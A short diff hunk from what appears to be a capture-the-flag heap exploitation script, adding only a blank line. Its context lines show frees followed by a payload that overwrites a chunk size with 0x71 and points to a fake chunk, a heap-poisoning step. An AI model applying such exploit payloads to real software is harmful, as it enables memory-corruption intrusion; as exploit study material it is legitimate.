@@ -42,6 +42,7 @@ def exp1():
     free(2)
     free(1)
 
+
     payload = b'a' * 0x68 + p64(0x71) + p64(magic_fake_chunk)
     edit(0, len(payload), payload)
 
